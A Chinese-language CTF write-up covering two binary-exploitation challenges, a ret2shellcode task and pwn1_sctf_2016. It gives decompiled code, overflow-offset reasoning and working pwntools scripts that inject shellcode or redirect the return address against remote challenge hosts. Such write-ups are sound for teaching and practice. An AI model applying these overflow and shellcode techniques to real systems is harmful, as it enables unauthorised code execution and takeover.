# PWN challenges

## [NewStarCTF 公开赛赛道]ret2shellcode

这是一道ret2shellcode的题型，但是通过checksec发现启用`PIE`保护，不能在`.bss`段写入`shellcode`

> <img src="./img_c/1.png">

查看`IDA`反编译信息

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Hello my friend.Any gift for me?");
  read(0, buf, 0x100uLL);
  puts("Anything else?");
  read(0, v4, 0x100uLL);
  puts("Ok.See you!");
  return 0;
}
```

- 第7行`mmap()`创建了一个缓冲区`buf`，大小为`0x1000`字节，重点是拥有`7`权限，即`rwx`权限

- 第9行向缓冲区`buf`中写入数据，总长度`0x100`字节
- 第11行向缓冲区`v4`写入数据，总长度`0x100`字节

根据`IDA`的分析来说，既然`buf`拥有`rwx`权限，那么我们可以向`buf`中写入`shellcode`，但是不能直接溢出`buf`，因为第一个`read()`限制了写入的数据长度`0x100`，该长度远远小于`buf`允许的最大长度`0x1000`，因此需要利用第二个`read()`，第二个`read()`写入的缓冲区`v4`仅有40字节，完全满足溢出条件

同时，`mmap()`函数也指定了缓冲区的内存地址`0x233000`，这一点也可以在`pwndbg`中验证

> <img src="./img_c/2.png">

然后计算从`v4`到`rbp`的长度

> <img src="./img_c/3.png">

从上图可以得出，从`rsp`到`rbp`共`0x30`个字节，加上`rbp`本身8字节，共需要溢出`0x38`个字节，下面是攻击脚本

```py
from pwn import *

context.arch = 'amd64'

buf_addr = 0x233000
shellcode = asm(shellcraft.amd64.sh())
payload = b'A' * 0x38 + p64(buf_addr)

io = remote('node5.buuoj.cn', 28144)
io.sendline(shellcode)
io.recv()
io.sendline(payload)
io.interactive()
```

运行脚本，得到flag

> <img src="./img_c/4.png">

## pwn1_sctf_2016 1

主要看`vuln()`函数

```c
int vuln()
{
  const char *v0; // eax
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  _BYTE v3[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  _BYTE v4[7]; // [esp+40h] [ebp-18h] BYREF
  char v5; // [esp+47h] [ebp-11h] BYREF
  _BYTE v6[7]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v7[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v5);
  std::string::string(v4, "you", &v5);
  std::allocator<char>::allocator(v7);
  std::string::string(v6, "I", v7);
  replace(v3);
  std::string::operator=(&input, v3, v6, v4);
  std::string::~string(v3);
  std::string::~string(v6);
  std::allocator<char>::~allocator(v7);
  std::string::~string(v4);
  std::allocator<char>::~allocator(&v5);
  v0 = std::string::c_str(&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```

大致内容是`fgets()`接收32字节的输入，传入`s`字符数组，然后执行替换函数`replace`，将`s`中的`I`替换为`you`，最后通过`strcpy()`将替换的结果返还`s`字符数组

这道题便是利用替换函数进行溢出，`s`位于`ebp - 0x3C`的位置，即60字节，只需要传入20个`I`，经过替换函数替换为20个`you`，然后拼接`ebp`和`ret_addr`即可，这道题的`ret_addr`是`get_flag()`函数，位于`0x08048F0D`

```c
int get_flag()
{
  return system("cat flag.txt");
}
```

因此脚本为

```py
from pwn import *

# sh = process('./pwn1_sctf_2016')
sh = remote('node5.buuoj.cn', 25308)

binsh = 0x8048F0D
payload = flat([b'I' * 20, b'aaa', binsh])
sh.sendline(payload)
sh.interactive()
```

> <img src="./img_c/5.png">

